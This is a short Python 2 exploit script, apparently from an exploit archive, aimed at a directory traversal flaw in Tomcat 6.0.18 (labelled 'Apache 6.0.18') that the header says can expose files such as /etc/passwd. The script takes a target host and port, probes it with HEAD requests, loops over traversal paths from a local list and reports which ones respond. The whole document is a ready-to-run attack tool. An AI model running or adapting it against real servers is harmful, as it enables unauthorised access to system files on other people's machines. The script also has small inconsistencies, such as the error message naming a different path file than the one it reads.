#!/usr/bin/python
#credit:Author: Simon Ryeo(bar4mi (at) gmail.com, barami (at) ahnlab.com)
#Description
#As Apache Security Team, this problem occurs because of JAVA side.
#If your context.xml or server.xml allows 'allowLinking'and 'URIencoding' as
#'UTF-8', an attacker can obtain your important system files.(e.g.  /etc/passwd)

#Exploit
#If your webroot directory has three depth(e.g /usr/local/wwwroot), An
#attacker can access arbitrary files as below. (Proof-of-concept)

import sys, httplib, time

def main(path):
	try:# make a http HEAD request
		baltazar = httplib.HTTP(rascal+":"+port)
		baltazar.putrequest("HEAD", path)
		baltazar.putheader("Host", rascal)
		baltazar.endheaders()
		status, reason, headers = baltazar.getreply()
	except: 
		print "Error: Name or service not known. Check your host."
		sys.exit(1)
	return status, reason, headers.get("Server")
		
def timer():
	now = time.localtime(time.time())
	return time.asctime(now)
	

if len(sys.argv) != 3:
	print "\n\t   Apache 6.0.18 directory traversal"
	print "\t--------------------------------------------------"
	print "\t beenudel1986[at]gmail.com"
	print "\t Greetz to d3hydr8,rsauron,baltazar,sinner_01,p4tr1ck"
	print "\n\tUsage: ./apache6.0.18.py <host> <port>\n"
	
	sys.exit(1)
	
rascal = sys.argv[1]
port = sys.argv[2]

if rascal[:7] == "http://":
	rascal = rascal.replace("http://","")


okresp = main("/")[:1]
badresp,reason,server = main("/work.html")

if okresp[0] == badresp:
	print "\nResponses matched, try another host.\n"
	sys.exit(1)
else:
	print "\n   Apache 6.0.18 directory traversal exploit"
	print "--------------------------------------------------"
	print "+ Target host:",rascal
	print "+ Target port:",port
	print "+ Target server:",server
	print "+ Target OK response:",okresp[0]
	print "+ Target BAD response:",badresp, reason
	print "+ Scan Started at",timer()


try:
	rsauron = open("vuls.txt", "r")
	patrick = rsauron.readlines()
	rsauron.close()
	print "\n[--",len(patrick),"paths loaded --]\n"
except(IOError): 
 	print "Error: Check your bins.txt path.\n"
	sys.exit(1)

bitch = 0

for line in patrick:
	try: status, reason = main(line)[:2]
	except(AttributeError): pass
	if status == okresp[0]:
		bitch += 1
		print "\t++",status,reason,":",rascal+line,"\n"
	if status == int(401):
		print "\t--",status,reason,":",rascal+line,"\tNeeds Authorization\n"
	else:							
		print "\n-",status,reason,":",rascal+line,"\n"
print "Scan completed at", timer()
if bitch == 0:
	print "Couldn't find anything.\n"
else:
	print "Found",bitch,"possible vulnerabilities, check manually.\n"

